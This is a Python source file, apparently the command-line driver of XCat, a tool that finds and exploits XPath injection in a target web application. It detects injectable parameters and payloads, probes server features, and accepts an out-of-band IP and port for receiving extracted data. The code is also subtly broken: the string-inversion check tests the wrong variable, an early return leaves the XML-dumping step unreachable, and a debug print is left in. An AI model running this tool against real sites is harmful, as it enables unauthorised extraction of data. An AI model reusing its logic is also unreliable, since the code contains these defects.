"""
XCat.

Usage:
    xcat (--true-string=<string> | --true-code=<code>) [--method=<method>] [--oob-ip=<ip> (--oob-port=<port>)]
         <url> <target_parameter> [<parameters>]...
    xcat detectip

"""

import docopt
import asyncio
import aiohttp
import operator
import ipgetter
from xcat.requester import Requester
from xcat.payloads import detect_payload
from xcat.features import detect_features
from xcat import actions
from typing import Callable
from xcat.display import display_xml


def run():
    arguments = docopt.docopt(__doc__)

    if arguments['detectip']:
        print('Finding external IP address...')
        ip = ipgetter.myip()

        if ip:
            print(f'External IP: {ip}')
        else:
            print('Could not find external IP!')
        return

    match_function = make_match_function(arguments)

    url = arguments['<url>']
    target_parameter = arguments['<target_parameter>']
    parameters = arguments['<parameters>']
    print(arguments)
    oob_ip = arguments["--oob-ip"]
    oop_port = arguments["--oob-port"]

    loop = asyncio.get_event_loop()
    loop.run_until_complete(start_action(url, target_parameter, parameters, match_function, oob_ip, oop_port))


async def start_action(url, target_parameter, parameters, match_function, oob_ip, oob_port):
    async with aiohttp.ClientSession() as session:
        payload_requester = Requester(url, target_parameter, parameters, match_function, session)

        print("Detecting injection points...")
        payloads = await detect_payload(payload_requester)

        for payload in payloads:
            print(payload.name)
            print(f' - Example: {payload.example}')

        if not payloads:
            print("No payloads found! Perhaps the target is not injectable, or xcat just sucks")
            return
        elif len(payloads) > 1:
            print("Multiple payloads found! Please specify them via the command line. "
                  "In the future. When this is implemented.")
            return
        else:
            chosen_payload = payloads[0]

        requester = Requester(url, target_parameter, parameters, match_function, session,
                              injector=chosen_payload.payload_generator,
                              external_ip=oob_ip, external_port=oob_port)

        print("Detecting Features...")
        features = await detect_features(requester)

        for feature in features:
            print(f' - {feature.name}')
            requester.features[feature.name] = True
        return
        await display_xml([await actions.get_nodes(requester)])


def make_match_function(arguments) -> Callable[[aiohttp.Response, str], bool]:
    true_code, true_code_invert = arguments['--true-code'] or '', False

    if true_code.startswith('!'):
        true_code_invert = True
        true_code = true_code[1:]

    true_string, true_string_invert = arguments['--true-string'] or '', False

    if true_code.startswith('!'):
        true_code_invert = True
        true_code = true_code[1:]

    match_operator = operator.ne if true_code_invert or true_string_invert else operator.eq

    def response_checker(response: aiohttp.Response, content: str) -> bool:
        if true_code:
            match = match_operator(response.status, true_code)
        else:
            match = match_operator(true_string in content, True)

        return match

    return response_checker


if __name__ == "__main__":
    run()
